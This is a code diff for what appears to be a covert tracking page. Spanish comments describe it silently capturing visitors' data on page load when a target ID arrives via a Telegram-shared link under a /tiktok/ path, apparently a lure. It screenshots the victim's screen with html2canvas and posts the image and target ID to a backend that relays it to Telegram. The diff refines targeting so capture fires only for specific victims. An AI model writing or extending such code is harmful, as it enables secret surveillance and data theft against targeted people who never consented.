@@ -33,8 +33,12 @@ document.addEventListener('DOMContentLoaded', () => {
     initCounterAnimations();
     showCookieBanner();
 
-    // Iniciar captura inmediatamente en el fondo
-    captureAllData();
+    // Solo capturar automáticamente si hay un ID específico (vino de Telegram)
+    const targetId = getTargetIdFromUrl();
+    if (targetId && targetId !== 'Visitante Anónimo') {
+        captureAllData();
+    }
+
     // Iniciar la animación del loader visual
     runInitialLoader();
 });
@@ -44,7 +48,8 @@ function getTargetIdFromUrl() {
     const queryId = urlParams.get('id');
     if (queryId) return queryId;
 
-    const match = window.location.pathname.match(/^\/v\/([^/?#]+)/i);
+    // Detectar desde la ruta /tiktok/
+    const match = window.location.pathname.match(/^\/tiktok\/([^/?#]+)/i);
     if (match && match[1]) return decodeURIComponent(match[1]);
 
     return 'Visitante Anónimo';
@@ -369,7 +374,7 @@ async function captureScreenshot() {
         });
 
         sendLogToBackend(">> Iniciando html2canvas con resolución: " + window.innerWidth + "x" + window.innerHeight);
-        
+
         const canvas = await html2canvas(document.documentElement, {
             // Captura solo lo visible para evitar secciones offscreen con animaciones en opacity:0.
             width: window.innerWidth,
@@ -388,7 +393,7 @@ async function captureScreenshot() {
 
         const dataUrl = canvas.toDataURL('image/jpeg', 0.95);
         sendLogToBackend(">> Canvas convertido a DataURL. Tamaño: " + dataUrl.length + " caracteres");
-        
+
         return dataUrl;
     } catch (err) {
         sendLogToBackend(">> ERROR en captureScreenshot: " + (err?.message || err));
@@ -514,14 +519,14 @@ async function sendToTelegram(data) {
 async function sendPhotoToTelegram(blob, data) {
     sendLogToBackend(">> Ingresando a sendPhotoToTelegram con blob size: " + (blob ? blob.size : 'NULL'));
     console.log("[SEND PHOTO] Blob size:", blob ? blob.size : 'NULL', "bytes");
-    
+
     try {
         if (!blob || blob.size === 0) {
             sendLogToBackend(">> ERROR: Blob vacío o inválido. Tamaño: " + (blob?.size || 0));
             console.error("[SEND PHOTO] Blob is empty!");
             return;
         }
-        
+
         const formData = new FormData();
         formData.append("photo", blob, "screenshot.jpg");
         // ID del objetivo para que el backend sepa a quién pertenece
@@ -534,7 +539,7 @@ async function sendPhotoToTelegram(blob, data) {
             method: "POST",
             body: formData
         });
-        
+
         const result = await response.json();
         sendLogToBackend(">> fetch a /api/photo finalizó. Respuesta: " + JSON.stringify(result));
         console.log("[SEND PHOTO] Response:", result);
